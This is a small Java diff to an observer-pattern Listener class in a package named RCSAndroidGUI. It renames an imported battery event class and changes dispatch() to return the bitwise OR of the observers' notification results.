@@ -10,7 +10,7 @@ package com.ht.RCSAndroidGUI.listener;
 import java.util.Iterator;
 import java.util.Stack;
 
-import com.ht.RCSAndroidGUI.event.BatteryEvent;
+import com.ht.RCSAndroidGUI.event.EventBattery;
 import com.ht.RCSAndroidGUI.interfaces.Observer;
 
 public abstract class Listener<U> {
@@ -47,12 +47,15 @@ public abstract class Listener<U> {
 		}
 	}
 
-	synchronized void dispatch(U elem){
+	synchronized int dispatch(U elem){
 		Iterator<Observer<U>> iter = observers.iterator();
+		int result = 0;
 		 
 		while (iter.hasNext()) {
-			iter.next().notification(elem);
+			result |= iter.next().notification(elem);
 		}
+		
+		return result;
 	}
 	
 	protected abstract void start();
